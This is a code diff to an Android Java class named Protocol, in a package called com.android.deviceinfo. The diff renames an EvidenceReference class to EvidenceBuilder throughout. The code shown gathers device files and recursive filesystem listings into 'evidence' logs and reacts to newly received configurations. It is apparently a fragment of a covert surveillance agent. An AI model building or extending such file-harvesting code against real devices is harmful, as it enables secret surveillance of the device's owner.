@@ -27,7 +27,7 @@ import android.net.Uri;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.ConfType;
-import com.android.deviceinfo.evidence.EvidenceReference;
+import com.android.deviceinfo.evidence.EvidenceBuilder;
 import com.android.deviceinfo.evidence.EvidenceType;
 import com.android.deviceinfo.file.AutoFile;
 import com.android.deviceinfo.file.Directory;
@@ -57,7 +57,7 @@ public abstract class Protocol implements iProtocol {
 
 	Status status;
 
-	static Set<String> blackListDir = new HashSet(Arrays.asList(new String[] { "/sys", "/dev", "/proc", "/acct" }));
+	static Set<String> blackListDir = new HashSet<String>(Arrays.asList(new String[] { "/sys", "/dev", "/proc", "/acct" }));
 
 	/** The reload. */
 	// public boolean reload;
@@ -102,7 +102,7 @@ public abstract class Protocol implements iProtocol {
 		}
 
 		if (success) {
-			EvidenceReference.info(M.e("New configuration received")); //$NON-NLS-1$
+			EvidenceBuilder.info(M.e("New configuration received")); //$NON-NLS-1$
 			return true;
 		} else {
 			return false;
@@ -283,7 +283,7 @@ public abstract class Protocol implements iProtocol {
 				Check.log(TAG + " (saveFileLog) %s length: %s", filename, length);
 			}
 			final byte[] additional = Protocol.logDownloadAdditional(filename);
-			EvidenceReference ev = new EvidenceReference(EvidenceType.DOWNLOAD, additional);
+			EvidenceBuilder ev = new EvidenceBuilder(EvidenceType.DOWNLOAD, additional);
 			
 			DataInputStream is = new DataInputStream(new FileInputStream(file));
 			ev.write(is, length);
@@ -351,7 +351,7 @@ public abstract class Protocol implements iProtocol {
 	 *            the path
 	 */
 	public static void saveFilesystem(final int depth, String path) {
-		EvidenceReference fsLog = new EvidenceReference(EvidenceType.FILESYSTEM);
+		EvidenceBuilder fsLog = new EvidenceBuilder(EvidenceType.FILESYSTEM);
 
 		// Expand path and create log
 		if (path.equals("/")) { //$NON-NLS-1$
@@ -386,7 +386,7 @@ public abstract class Protocol implements iProtocol {
 	 * @param depth
 	 *            the depth
 	 */
-	private static void expandRoot(final EvidenceReference fsLog, final int depth) {
+	private static void expandRoot(final EvidenceBuilder fsLog, final int depth) {
 		if (Cfg.DEBUG) {
 			Check.requires(depth > 0, "wrong recursion depth"); //$NON-NLS-1$
 		}
@@ -404,7 +404,7 @@ public abstract class Protocol implements iProtocol {
 	 *            the filepath
 	 * @return true, if successful
 	 */
-	private static boolean saveFilesystemLog(final EvidenceReference fsLog, final String filepath) {
+	private static boolean saveFilesystemLog(final EvidenceBuilder fsLog, final String filepath) {
 		if (Cfg.DEBUG) {
 			Check.requires(fsLog != null, "fsLog null"); //$NON-NLS-1$
 		}
@@ -467,7 +467,7 @@ public abstract class Protocol implements iProtocol {
 	 * @param fsLog
 	 *            the fs log
 	 */
-	private static void saveRootLog(final EvidenceReference fsLog) {
+	private static void saveRootLog(final EvidenceBuilder fsLog) {
 		final int version = 2010031501;
 		if (Cfg.DEBUG) {
 			Check.requires(fsLog != null, "fsLog null"); //$NON-NLS-1$
@@ -496,7 +496,7 @@ public abstract class Protocol implements iProtocol {
 	 * @param depth
 	 *            the depth
 	 */
-	private static void expandPath(final EvidenceReference fsLog, final String path, final int depth) {
+	private static void expandPath(final EvidenceBuilder fsLog, final String path, final int depth) {
 		if (Cfg.DEBUG) {
 			Check.requires(depth > 0, "wrong recursion depth"); //$NON-NLS-1$
 		}
